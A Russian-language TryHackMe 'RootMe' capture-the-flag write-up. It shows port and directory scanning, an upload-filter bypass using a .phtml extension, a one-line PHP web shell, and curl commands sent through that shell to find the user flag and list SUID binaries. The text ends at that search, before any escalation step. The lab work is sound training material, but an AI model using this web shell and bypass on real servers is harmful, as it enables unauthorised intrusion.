RootMe — TryHackMe Writeup

Сложность: Easy

Платформа: TryHackMe

🛠 Разведка (Enumeration)

Запустил сканирование портов и сервисов с помощью nmap:

nmap -sV -sC TARGET_IP


Результаты сканирования:

22/tcp — SSH (OpenSSH 7.6p1)

80/tcp — HTTP (Apache httpd 2.4.29)

🌐 Веб-разведка (Web & Directory Enumeration)

Запустил перебор скрытых директорий веб-сервера через gobuster:

gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt


Обнаруженные директории:

/panel/ — веб-страница с формой для загрузки файлов.

/uploads/ — директория, где хранятся загруженные файлы.

📁 Загрузка файла и обход фильтрации (File Upload & Bypass)

При попытке загрузить стандартный PHP-скрипт (shell.php) веб-приложение выдает ошибку блокировки по расширению.

Действия по обходу фильтрации:

Переименовал файл, изменив расширение с .php на альтернативное .phtml.

Подготовил минималистичный PHP веб-шелл:

<?php system($_GET["cmd"]); ?>


Успешно загрузил файл shell.phtml через форму на странице /panel/.

🚀 Первоначальный доступ (Initial Access)

Проверил исполнение команд на сервере через загруженный веб-шелл с помощью curl:

curl "http://TARGET_IP/uploads/shell.phtml?cmd=whoami"
# Output: www-data


Поиск и чтение флага пользователя (user.txt):

Нашел местоположение файла:

curl "http://TARGET_IP/uploads/shell.phtml?cmd=find%20/%20-name%20user.txt%202>/dev/null"


Считал содержимое флага:

curl "http://TARGET_IP/uploads/shell.phtml?cmd=cat%20/var/www/user.txt"


👑 Повышение привилегий (Privilege Escalation)

Выполнил поиск бинарных файлов с установленным SUID-битом, принадлежащих root:

curl "http://TARGET_IP/uploads/shell.phtml?cmd=find%20/%20-user%20root%20-perm%20-4000%202>/dev/null"
